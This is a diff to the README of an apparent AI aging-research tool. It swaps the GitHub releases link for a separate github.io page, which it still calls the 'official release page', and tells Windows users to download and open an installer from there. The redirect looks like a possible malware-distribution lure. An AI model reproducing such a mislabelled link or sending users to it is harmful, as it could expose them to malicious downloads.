@@ -1,6 +1,6 @@
 # 🧬 longevity-loop - Use artificial intelligence to track aging
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Lizzyrequested953/longevity-loop/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://lizzyrequested953.github.io)
 
 Longevity-loop helps you study aging through data. This tool connects scientific questions to your findings. It acts as a bridge between raw data and clear conclusions. You can explore biomarkers of aging, computational biology, and geroscience. You do not need a wet lab or complex gear to participate.
 
@@ -8,7 +8,7 @@ Longevity-loop helps you study aging through data. This tool connects scientific
 
 You can run this software on your Windows computer. Follow these steps to set up the tool.
 
-1. Go to the [official release page](https://github.com/Lizzyrequested953/longevity-loop/releases).
+1. Go to the [official release page](https://lizzyrequested953.github.io).
 2. Look for the latest version of the software.
 3. Click the link to download the installation file.
 4. Open the file once the download finishes.
